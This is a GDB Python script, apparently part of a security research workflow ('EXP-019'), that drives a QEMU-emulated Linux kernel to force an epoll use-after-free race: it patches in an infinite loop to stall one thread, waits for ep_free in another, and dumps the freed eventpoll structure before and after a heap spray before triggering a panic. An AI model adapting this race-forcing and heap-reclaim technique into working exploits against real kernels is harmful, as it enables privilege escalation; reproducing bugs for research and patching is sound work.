import gdb
import time
import os
import signal
import threading

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

gdb.execute("set logging file evidence/EXP-019_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging on")

def log(msg):
    print(f"[*] {msg}", flush=True)

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

target_epoll_addr = 0
orig_insn = 0
ep_remove_wr_once_addr = 0

class RaceControl(gdb.Breakpoint):
    def __init__(self):
        super(RaceControl, self).__init__("*(__ep_remove + 0x19c)", internal=False)
        self.target_epoll = None

    def stop(self):
        global target_epoll_addr, orig_insn, ep_remove_wr_once_addr
        
        log(f"Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).")
        
        target_file = int(gdb.parse_and_eval("$x23"))
        self.target_epoll = int(gdb.parse_and_eval(f"*(long*)({target_file} + 32)"))
        target_epoll_addr = self.target_epoll
        
        log(f"target_file={hex(target_file)}, target_epoll={hex(self.target_epoll)}")
        
        ep_remove_wr_once_addr = int(gdb.parse_and_eval("__ep_remove + 0x19c"))
        orig_insn = int(gdb.parse_and_eval(f"*(int*)({ep_remove_wr_once_addr})"))
        log(f"Original instruction at {hex(ep_remove_wr_once_addr)}: {hex(orig_insn)}")
        
        gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = 0x14000000")
        log("Patched PC with infinite loop to suspend Thread A!")
        
        EpFreeBreak()
        self.enabled = False
        return False

class EpFreeBreak(gdb.Breakpoint):
    def __init__(self):
        # Same hardcoded address as EXP-018
        super(EpFreeBreak, self).__init__("*0xffff8000802bcbb4", internal=False)

    def stop(self):
        ep = int(gdb.parse_and_eval("$x22"))
        log(f"Thread B hit ep_free({hex(ep)})!")
        EpFreeFinish()
        self.enabled = False
        return False

class EpFreeFinish(gdb.Breakpoint):
    def __init__(self):
        # Same hardcoded address as EXP-018 (ep_free + 8)
        super().__init__("*0xffff8000802bcbbc", internal=False)

    def stop(self):
        global target_epoll_addr
        
        log(f"Thread B finished ep_free. target_epoll is now FREED!")
        
        log("Memory dump of freed struct eventpoll (BEFORE spray):")
        try:
            mem_dump = gdb.execute(f"x/24gx {target_epoll_addr}", to_string=True)
            log("\n" + mem_dump)
        except Exception as e:
            log(f"Error reading memory: {e}")
            
        def interrupt_later():
            time.sleep(3.0)  # Longer wait for spray
            log("Timer fired! Interrupting GDB to check spray...")
            os.kill(os.getpid(), signal.SIGINT)
            
        t = threading.Thread(target=interrupt_later)
        t.daemon = True
        t.start()
        
        self.enabled = False
        return False

def stop_handler(event):
    global target_epoll_addr, orig_insn, ep_remove_wr_once_addr
    
    if isinstance(event, gdb.SignalEvent):
        if event.stop_signal == "SIGINT":
            log("Interrupted! Dumping memory (AFTER spray):")
            try:
                addr = target_epoll_addr
                mem_dump = gdb.execute(f"x/24gx {addr}", to_string=True)
                log("\n" + mem_dump)
                
                # Verify the marker at offset 136 (address + 136 = address + 0x88)
                marker_addr = addr + 136
                marker_val = gdb.execute(f"x/gx {marker_addr}", to_string=True)
                log(f"Marker at {hex(marker_addr)} (offset 136): {marker_val.strip()}")
                
            except Exception as e:
                log(f"Error reading memory: {e}")
            
            log("Restoring Thread A's instruction and continuing to trigger panic...")
            try:
                if ep_remove_wr_once_addr and orig_insn:
                    gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = {orig_insn}")
                    log(f"Restored original instruction at {hex(ep_remove_wr_once_addr)}")
            except Exception as e:
                log(f"Error restoring instruction: {e}")
            
            log("Executing continue to trigger panic...")
            gdb.execute("c")
            return
            
        if event.stop_signal in ["SIGTRAP", "SIGSEGV", "SIGBUS"]:
            log(f"CRASH DETECTED! Signal: {event.stop_signal}")
            log("Capturing full crash evidence...")
            try:
                log("=== BACKTRACE ===")
                bt = gdb.execute("bt", to_string=True)
                log(bt)
                
                log("=== REGISTERS ===")
                regs = gdb.execute("info registers", to_string=True)
                log(regs)
                
                log("=== CURRENT INSTRUCTION ===")
                dis = gdb.execute("x/i $pc", to_string=True)
                log(dis)
                
                log("=== FAULTING ADDRESS ANALYSIS ===")
                try:
                    gdb.execute("p/x $x0")
                    gdb.execute("p/x $x1")
                    gdb.execute("p/x $x2")
                    gdb.execute("p/x $x3")
                except:
                    pass
                    
            except Exception as e:
                log(f"Error capturing crash evidence: {e}")
            
            log("Exiting GDB after crash capture.")
            gdb.execute("quit")

gdb.events.stop.connect(stop_handler)

RaceControl()
log("Breakpoints set. Continuing execution.")

def interrupt_if_hung():
    time.sleep(25.0)
    log("Hang timeout! Interrupting GDB...")
    os.kill(os.getpid(), signal.SIGINT)

t_hung = threading.Thread(target=interrupt_if_hung)
t_hung.daemon = True
t_hung.start()

try:
    gdb.execute("c")
except KeyboardInterrupt:
    pass
except gdb.error as e:
    log(f"Execution stopped: {e}")

gdb.execute("quit")